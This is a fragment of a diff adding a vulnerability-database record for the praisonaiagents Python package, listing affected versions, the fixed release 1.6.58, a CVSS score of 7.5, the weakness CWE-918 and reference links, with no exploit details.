+      - pkg:pypi/praisonaiagents@1.5.116
+      - pkg:pypi/praisonaiagents@1.5.117
+      - pkg:pypi/praisonaiagents@1.5.118
+      - pkg:pypi/praisonaiagents@1.5.119
+      - pkg:pypi/praisonaiagents@1.5.120
+      - pkg:pypi/praisonaiagents@1.5.121
+      - pkg:pypi/praisonaiagents@1.5.122
+      - pkg:pypi/praisonaiagents@1.5.123
+      - pkg:pypi/praisonaiagents@1.5.124
+      - pkg:pypi/praisonaiagents@1.5.125
+      - pkg:pypi/praisonaiagents@1.5.126
+      - pkg:pypi/praisonaiagents@1.5.127
+      - pkg:pypi/praisonaiagents@1.5.128
+      - pkg:pypi/praisonaiagents@1.5.129
+      - pkg:pypi/praisonaiagents@1.5.130
+      - pkg:pypi/praisonaiagents@1.5.131
+      - pkg:pypi/praisonaiagents@1.5.132
+      - pkg:pypi/praisonaiagents@1.5.133
+      - pkg:pypi/praisonaiagents@1.5.134
+      - pkg:pypi/praisonaiagents@1.5.135
+      - pkg:pypi/praisonaiagents@1.5.136
+      - pkg:pypi/praisonaiagents@1.5.137
+      - pkg:pypi/praisonaiagents@1.5.138
+      - pkg:pypi/praisonaiagents@1.5.139
+      - pkg:pypi/praisonaiagents@1.5.140
+      - pkg:pypi/praisonaiagents@1.5.141
+      - pkg:pypi/praisonaiagents@1.5.142
+      - pkg:pypi/praisonaiagents@1.5.143
+      - pkg:pypi/praisonaiagents@1.5.144
+      - pkg:pypi/praisonaiagents@1.5.145
+      - pkg:pypi/praisonaiagents@1.5.146
+      - pkg:pypi/praisonaiagents@1.5.147
+      - pkg:pypi/praisonaiagents@1.5.148
+      - pkg:pypi/praisonaiagents@1.5.149
+      - pkg:pypi/praisonaiagents@1.6.1
+      - pkg:pypi/praisonaiagents@1.6.2
+      - pkg:pypi/praisonaiagents@1.6.3
+      - pkg:pypi/praisonaiagents@1.6.4
+      - pkg:pypi/praisonaiagents@1.6.5
+      - pkg:pypi/praisonaiagents@1.6.6
+      - pkg:pypi/praisonaiagents@1.6.7
+      - pkg:pypi/praisonaiagents@1.6.8
+      - pkg:pypi/praisonaiagents@1.6.9
+      - pkg:pypi/praisonaiagents@1.6.10
+      - pkg:pypi/praisonaiagents@1.6.11
+      - pkg:pypi/praisonaiagents@1.6.12
+      - pkg:pypi/praisonaiagents@1.6.13
+      - pkg:pypi/praisonaiagents@1.6.14
+      - pkg:pypi/praisonaiagents@1.6.15
+      - pkg:pypi/praisonaiagents@1.6.16
+      - pkg:pypi/praisonaiagents@1.6.17
+      - pkg:pypi/praisonaiagents@1.6.18
+      - pkg:pypi/praisonaiagents@1.6.19
+      - pkg:pypi/praisonaiagents@1.6.20
+      - pkg:pypi/praisonaiagents@1.6.21
+      - pkg:pypi/praisonaiagents@1.6.22
+      - pkg:pypi/praisonaiagents@1.6.23
+      - pkg:pypi/praisonaiagents@1.6.24
+      - pkg:pypi/praisonaiagents@1.6.25
+      - pkg:pypi/praisonaiagents@1.6.26
+      - pkg:pypi/praisonaiagents@1.6.27
+      - pkg:pypi/praisonaiagents@1.6.28
+      - pkg:pypi/praisonaiagents@1.6.29
+      - pkg:pypi/praisonaiagents@1.6.30
+      - pkg:pypi/praisonaiagents@1.6.31
+      - pkg:pypi/praisonaiagents@1.6.32
+      - pkg:pypi/praisonaiagents@1.6.33
+      - pkg:pypi/praisonaiagents@1.6.34
+      - pkg:pypi/praisonaiagents@1.6.35
+      - pkg:pypi/praisonaiagents@1.6.36
+      - pkg:pypi/praisonaiagents@1.6.37
+      - pkg:pypi/praisonaiagents@1.6.38
+      - pkg:pypi/praisonaiagents@1.6.39
+      - pkg:pypi/praisonaiagents@1.6.40
+      - pkg:pypi/praisonaiagents@1.6.41
+      - pkg:pypi/praisonaiagents@1.6.42
+      - pkg:pypi/praisonaiagents@1.6.43
+      - pkg:pypi/praisonaiagents@1.6.44
+      - pkg:pypi/praisonaiagents@1.6.45
+      - pkg:pypi/praisonaiagents@1.6.46
+      - pkg:pypi/praisonaiagents@1.6.47
+      - pkg:pypi/praisonaiagents@1.6.48
+      - pkg:pypi/praisonaiagents@1.6.50
+      - pkg:pypi/praisonaiagents@1.6.51
+      - pkg:pypi/praisonaiagents@1.6.52
+      - pkg:pypi/praisonaiagents@1.6.53
+      - pkg:pypi/praisonaiagents@1.6.54
+      - pkg:pypi/praisonaiagents@1.6.55
+      - pkg:pypi/praisonaiagents@1.6.56
+      - pkg:pypi/praisonaiagents@1.6.57
+    fixed_packages:
+      - pkg:pypi/praisonaiagents@1.6.58
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-5r34-2g38-6569/GHSA-5r34-2g38-6569.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-918
+references:
+  - url: https://github.com/MervinPraison/PraisonAI
+    reference_type:
+    reference_id:
+  - url: https://github.com/MervinPraison/PraisonAI/commit/2f9677abb2ea68eab864ee8b6a828fd0141612e1
+    reference_type: other
+    reference_id: 2f9677abb2ea68eab864ee8b6a828fd0141612e1
+  - url: https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-5r34-2g38-6569
+    reference_type: other
+    reference_id: GHSA-5r34-2g38-6569
+  - url: https://github.com/MervinPraison/PraisonAI/releases/tag/v4.6.58
+    reference_type: other
+    reference_id: v4.6.58
+exploits: []
